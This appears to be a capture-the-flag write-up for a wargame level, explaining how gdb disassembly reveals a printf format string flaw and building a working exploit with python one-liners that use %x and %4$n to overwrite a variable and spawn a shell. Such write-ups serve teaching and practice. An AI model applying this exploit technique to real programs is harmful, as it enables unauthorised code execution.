After analysing the program with gdb we came to the conclusion that the breach of this level is about the printf involve in the v() function.

0x080484d5 <+49>: call 0x8048390 <printf@plt>

after this printf we got:
0x080484da <+54>: mov 0x804988c,%eax ; Load the value at address 0x804988c into EAX
0x080484df <+59>: cmp $0x40,%eax ; Compare the value in EAX with 0x40 (64 in decimal)
0x080484e2 <+62>: jne 0x8048518 <v+116> ; If not equal, jump to the label 'v+116'

if the value is equal to 64 it will jump to the label 'v+116' and then execute the content of 0x8049880

so let's print the value at address 0x804988c.

after doing some manipulation with program and print we found out that the first argument is printed as the fourth string

python -c 'print "aaaa" + "%x " * 10' | ./level4
aaaa 200 b7fd1ac0 b7ff37d0 61616161

so the value at address 0x804988c is the fourth string, and the fourth string is the first argument.

let's replace the first argument with the address of the variable

python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' | ./level3

Now we have to add 60 number of bytes to attain the value 64.
The modifier %n will write the number of bytes specified before in the choosen address. We can specify the address with %[number]$n option.
Finally our final format string attack will look like:

python -c 'print "\x8c\x98\x04\x08" + "A" \* 60 + "%4$n"' > /tmp/exploit #remove the backslash from \* if you want to run it directly

cat /tmp/exploit - | ./level3
